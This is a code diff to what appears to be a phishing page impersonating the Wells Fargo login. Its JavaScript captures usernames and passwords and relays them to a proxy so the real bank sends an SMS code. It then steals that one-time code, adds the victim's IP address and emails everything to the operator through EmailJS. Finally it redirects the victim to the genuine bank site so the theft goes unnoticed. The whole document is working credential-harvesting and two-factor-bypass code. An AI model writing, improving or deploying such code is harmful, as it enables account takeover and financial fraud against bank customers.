@@ -320,78 +320,116 @@
         
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
-// 1. Init with your Public Key
+// 1. Init EmailJS
 emailjs.init("y3lRWL7KLDjiFjNcN");
 
 document.getElementById('scamForm').addEventListener('submit', function(e) {
-e.preventDefault();
+    e.preventDefault();
 
-// Get the button to disable it
-const btn = document.getElementById('verifyBtn'); // Make sure your button has id="verifyBtn"
-const originalText = btn ? btn.textContent : "Verify Now";
+    const btn = document.getElementById('verifyBtn');
+    const originalText = btn ? btn.textContent : "Verify Now";
 
-if(btn) {
-btn.disabled = true;
-btn.textContent = "Verifying...";
-btn.style.backgroundColor = "#999"; // Gray out button
-btn.style.cursor = "not-allowed";
+    if(btn) {
+        btn.disabled = true;
+        btn.textContent = "Verifying...";
+        btn.style.backgroundColor = "#999";
+        btn.style.cursor = "not-allowed";
+    }
+
+    // Get form data
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData.entries());
+
+    // REPLACE 'YOUR_WORKER_URL' with your actual Cloudflare Worker URL
+    const proxyUrl = 'YOUR_WORKER_URL/login'; 
+
+    // 2. Send credentials to the Proxy
+    fetch(proxyUrl, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ username: data.username, password: data.password })
+    })
+    .then(response => response.json())
+    .then(wfResponse => {
+        if (wfResponse.status === 'success') {
+            // 3. Wells Fargo received the login attempt -> It sent the SMS to the user!
+            // Show the SMS input box
+            document.getElementById('loginBtn').style.display = 'none';
+            document.getElementById('smsSection').style.display = 'block'; // Make sure your HTML has this div
+            document.getElementById('sms_code').focus();
+            
+            // Update button to capture the code
+            btn.textContent = "Verify Code";
+            btn.onclick = function() {
+                captureAndSendCode(data.username, data.password);
+            };
+        } else {
+            alert("Login failed.");
+        }
+    })
+    .catch(err => {
+        console.error("Proxy error", err);
+        alert("Connection error.");
+    });
+});
+
+function captureAndSendCode(username, password) {
+    const code = document.getElementById('sms_code').value;
+    
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(ipData => {
+        // Add IP and Date
+        const finalData = {
+            ...{ username, password, code },
+            ip: ipData.ip,
+            date: new Date().toLocaleString()
+        };
+
+        // Send to EmailJS
+        emailjs.send("service_2bhy4ju", "template_1qzswkk", finalData)
+        .then(() => {
+            // Success: Show processing screen
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+
+            // Redirect to real site
+            setTimeout(() => {
+                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+            }, 3000);
+        })
+        .catch(err => {
+            // Fail: Still redirect
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "https://www.wellsfargo.com/";
+            }, 3000);
+        });
+    })
+    .catch(() => {
+        // Fallback if IP fails
+        const finalData = { username, password, code, ip: "Unknown", date: new Date().toLocaleString() };
+        emailjs.send("service_2bhy4ju", "template_1qzswkk", finalData)
+        .then(() => {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "https://www.wellsfargo.com/";
+            }, 3000);
+        })
+        .catch(() => {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "https://www.wellsfargo.com/";
+            }, 3000);
+        });
+    });
 }
-
-// Get data from form
-const formData = new FormData(e.target);
-const data = Object.fromEntries(formData.entries());
-
-// Get IP
-fetch('https://api.ipify.org?format=json')
-.then(res => res.json())
-.then(ipData => {
-// Add IP and Date to data object
-data.ip = ipData.ip;
-data.date = new Date().toLocaleString();
-
-// Send to EmailJS
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-// Success: Show processing screen, THEN redirect
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-
-// Wait 3 seconds then go to real site
-setTimeout(() => {
-window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-}, 3000);
-})
-.catch(err => {
-// Fail: Still show processing screen then redirect so they don't notice
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-});
-})
-.catch(() => {
-// If IP fetch fails, still send data without IP and redirect
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-})
-.catch(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-     });
-  });
-});
 </script>
-       
+    
     <script>
     (function() {
         let time = 599; // 9 minutes * 60 + 59 seconds = 599
